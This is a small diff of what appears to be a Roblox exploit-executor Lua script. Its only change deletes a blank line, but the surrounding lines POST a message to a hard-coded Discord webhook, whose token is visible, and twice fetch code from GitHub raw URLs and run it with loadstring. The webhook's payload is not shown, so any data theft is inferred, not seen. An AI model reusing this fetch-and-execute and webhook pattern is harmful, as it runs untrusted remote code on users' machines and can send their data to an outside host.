@@ -18,7 +18,6 @@ local url = "https://discord.com/api/webhooks/986982544610320476/TrUncT9_OQWdgJt
 
 syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
 
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/EJGAMINGGGXXXDYT"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/Gosubnowpls1"))()
